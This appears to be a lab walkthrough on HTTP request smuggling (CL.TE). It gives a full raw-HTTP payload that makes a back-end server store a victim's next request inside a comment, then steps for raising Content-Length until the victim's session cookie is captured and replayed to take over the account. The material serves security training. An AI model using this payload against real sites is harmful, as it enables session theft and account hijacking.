Concept

In this attack, the goal is not only to smuggle a request, but also to capture another user's HTTP request.

The attacker sends a smuggled request to an endpoint that stores user input (for example, POST /post/comment) and deliberately sets the Content-Length larger than the actual request body.

As a result, the back-end server waits for additional bytes. When the victim's request arrives, it is treated as the remaining body of the attacker's request and is stored inside the application.

Attack Flow
Attacker Request
        │
        ▼
Front-end
(Uses Content-Length)
        │
        ▼
Back-end
(Uses Transfer-Encoding)
        │
        ▼
Processes the smuggled request
        │
        ▼
Waits for the remaining body
(Content-Length not satisfied)
        │
        ▼
Victim Request arrives
        │
        ▼
Victim Request becomes part of the comment
        │
        ▼
Stored inside the application
Payload
POST / HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: <Calculated by Burp>
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=<your-session>

csrf=<csrf>&postId=<id>&name=test&email=test@example.com&website=&comment=test
Why is comment the Last Parameter?

The victim's request will be appended to the last parameter in the request body.

Example:

comment=testGET / HTTP/1.1
Host: ...
Cookie: session=...

This causes the captured request to be stored as part of the comment.

Why Increase Content-Length?

The actual body is smaller than the declared Content-Length.

Therefore, the back-end continues waiting for more data:

Actual Body
      +
Victim Request
      =
Declared Content-Length
Incomplete Capture

If only part of the victim's request is stored, for example:

GET / HTTP/1.1
Host: ...
User-Agent: ...

and the Cookie header is missing, the request was only partially captured.

Fix

Gradually increase the Content-Length of the smuggled request until the entire request is captured.

Example:

400
420
440
460
480
...

Eventually, the stored request will include:

Cookie: victim-fingerprint=...
Cookie: session=<victim-session>

or

Cookie: victim-fingerprint=...; secret=...; session=<victim-session>

Copy the victim's session value and send:

GET /my-account HTTP/1.1
Host: target
Cookie: session=<victim-session>

to access the victim's account.

Key Notes
Use HTTP/1.1, not HTTP/2.
Place the comment parameter last in the request body.
Let Burp Suite calculate the outer Content-Length.
Only adjust the inner (smuggled) Content-Length.
If the captured request is incomplete, increase the inner Content-Length gradually until the Cookie header (including session) is fully captured.
The victim's request is generated intermittently, so you may need to repeat the attack several times before capturing the desired request.